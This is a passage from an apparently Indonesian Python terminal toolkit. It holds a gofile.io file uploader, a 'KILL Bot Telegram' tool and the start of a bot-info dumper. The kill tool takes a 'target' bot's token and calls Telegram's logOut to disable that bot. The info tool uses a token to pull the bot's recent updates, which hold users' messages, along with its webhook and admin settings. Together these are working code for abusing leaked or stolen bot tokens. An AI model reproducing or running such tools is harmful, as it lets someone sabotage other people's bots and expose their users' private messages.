⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠁
"""
    os.system(f'echo "{ascii_photo}" | lolcat 2>/dev/null || echo "{ascii_photo}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}File to URL {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ Masukkan Path file yang ingin di Upload Menjadi Link {R}/{W} URL
{W}│ Contoh {R}:{a} /sdcard/folder/file
{W}╰─────────────────────────────────────────────────────────────────╯""")
    file_path = input(f"{U}❯❯❯ {W}Path file {G}❯{N} ").strip()
    
    if not file_path:
        print(f"\n{W}[ {R}??{W} ] Path tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if not os.path.exists(file_path):
        print(f"\n{W}[ {R}??{W} ] File tidak ditemukan!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    file_size = os.path.getsize(file_path) / (1024 * 1024)
    if file_size > 10240:
        print(f"\n{W}[ {R}??{W} ] File terlalu besar! Maksimal 10GB{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar_upload(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengupload File [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    def upload_gofile(file_path):
        try:
            session = requests.Session()
            
            resp = session.get('https://api.gofile.io/servers')
            if resp.status_code != 200:
                return None, f"Gagal mendapatkan server (HTTP {resp.status_code})"
            
            server_data = resp.json()
            if server_data.get('status') != 'ok':
                return None, server_data.get('status', 'Unknown error')
            
            servers = server_data.get('data', {}).get('servers', [])
            if not servers:
                return None, "Tidak ada server tersedia"
            
            if isinstance(servers[0], dict):
                server = servers[0].get('name')
            else:
                server = servers[0]
            
            if not server:
                return None, "Server name tidak ditemukan"
            
            upload_url = f"https://{server}.gofile.io/uploadFile"
            
            filename = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                files = {'file': (filename, f)}
                resp = session.post(upload_url, files=files, timeout=300)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'ok':
                    url = data.get('data', {}).get('downloadPage')
                    if url:
                        return url, None
                    else:
                        return None, "Gagal mendapatkan URL"
                else:
                    return None, data.get('status', 'Unknown error')
            else:
                return None, f"HTTP {resp.status_code}"
                
        except requests.exceptions.Timeout:
            return None, "Timeout, file mungkin terlalu besar"
        except Exception as e:
            return None, str(e)
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_upload, args=(stop,))
    t.daemon = True
    t.start()
    
    url, error = upload_gofile(file_path)
    
    stop.set()
    t.join()
    
    if url:
        filename = os.path.basename(file_path)
        file_size_kb = os.path.getsize(file_path) / 1024
        
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Upload Berhasil!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}File      {R}: {G}{filename}{N}")
        print(f"{W}│ {W}Size      {R}: {G}{file_size_kb:.2f} KB{N}")
        print(f"{W}│ {W}URL       {R}: {G}{url}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    else:
        print(f"\n{W}[ {R}??{W} ] Upload gagal: {error}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_bunuh_bot_telegram():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, requests, json, threading
    from datetime import datetime
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_kill = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_kill}" | lolcat 2>/dev/null || echo "{ascii_kill}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}KILL Bot Telegram {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")

    def load_bar_kill(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Membunuh Bot [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan Token Bot Telegram target")
    print(f"{W}│ Contoh {R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    token = input(f"{U}❯❯❯ {W}Token Bot {G}❯{N} ").strip()
    
    if not token:
        print(f"\n{W}[ {R}??{W} ] Token tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    def telegram_bot_get_info(token):
        url = f'https://api.telegram.org/bot{token}/getMe'
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.json()
            return None
        except:
            return None
    
    def telegram_bot_kill(token):
        url = f'https://api.telegram.org/bot{token}/logOut'
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.json()
            return None
        except:
            return None
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_kill, args=(stop,))
    t.daemon = True
    t.start()
    
    bot_info = telegram_bot_get_info(token)
    
    stop.set()
    t.join()
    
    if not bot_info or not bot_info.get('ok'):
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}✗{W} Token Bot Tidak Valid!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    bot_data = bot_info['result']
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Informasi Bot{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
    print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
    print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
    print(f"{W}│ {W}Bot       {R}: {G}{'Ya' if bot_data.get('is_bot', False) else 'Bukan Bot'}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    
    confirm = input(f"{U}❯❯❯ {W}Ketik {G}KILL{W} untuk bunuh bot, atau {R}NO{W} batal {G}❯{N} ").strip().upper()
    
    if confirm == 'NO':
        print(f"{W}[ {R}!!{W} ] Dibatalkan{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if confirm != 'KILL':
        print(f"{W}[ {R}??{W} ] Input tidak valid!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    print(f"{W}[ {R}!!{W} ] Membunuh bot...{N}")
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_kill, args=(stop,))
    t.daemon = True
    t.start()
    
    result = telegram_bot_kill(token)
    
    stop.set()
    t.join()
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    
    if result and result.get('ok'):
        print(f"{W}│ {G}✓{W} Bot Berhasil Dibunuh!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
        print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
        print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
        print(f"{W}│ {W}Status    {R}: {G}Succesfuly{N}")
    else:
        print(f"{W}│ {R}✗{W} Gagal Membunuh Bot!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}ID        {R}: {G}{bot_data.get('id', 'N/A')}{N}")
        print(f"{W}│ {W}Username  {R}: {G}@{bot_data.get('username', 'N/A')}{N}")
        print(f"{W}│ {W}Nama      {R}: {G}{bot_data.get('first_name', 'N/A')}{N}")
        print(f"{W}│ {W}Status    {R}: {R}failed{N}")
    
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_cek_bot_telegram():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, requests, json, threading
    from datetime import datetime
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_bot = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⢀⣠⠄⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠁⠀⠀⠀⠀⢀⣤⡶⠟⠁⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣴⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_bot}" | lolcat 2>/dev/null || echo "{ascii_bot}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Cek info Bot Telegram {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")
    
    def load_bar_info(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengambil Informasi Bot [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan {G}Token Bot Telegram")
    print(f"{W}│ Contoh {R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    token = input(f"{U}❯❯❯ {W}Masukkan Token Bot {G}❯{N} ").strip()
    
    if not token:
        print(f"\n{W}[ {R}??{W} ] Token tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_info, args=(stop,))
    t.daemon = True
    t.start()
    
    info = {}
    
    try:
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['getMe'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getWebhookInfo', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['webhook'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getUpdates', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['updates'] = data.get('result', [])
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyCommands', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['commands'] = data.get('result', [])
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyDefaultAdministratorRights', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['admin_rights'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyName', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['name'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyDescription', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['description'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyShortDescription', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok'):
                info['short_description'] = data.get('result', {})
        
        resp = requests.get(f'https://api.telegram.org/bot{token}/getMyName?language_code=id', timeout=10)
        if resp.status_code == 200:
